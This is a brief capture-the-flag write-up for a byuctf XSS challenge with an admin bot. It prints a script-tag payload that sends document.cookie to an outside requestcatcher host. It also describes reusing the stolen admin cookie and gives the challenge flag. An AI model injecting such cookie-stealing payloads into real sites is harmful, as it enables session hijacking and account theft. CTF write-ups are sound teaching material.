This challenge is a simple XSS challenge with an adminbot. 

Just submitting a ticket with the script:

<script>
  fetch("https://camel.requestcatcher.com/" + document.cookie)
</script>

This will automatically forward a request with the adminbot's cookies to that domain, and you can view the admin_pass from there. After that, just set a cookie to that value and the flag is on the "View Tickets" page.

Flag: byuctf{s33_1t5_3asy!}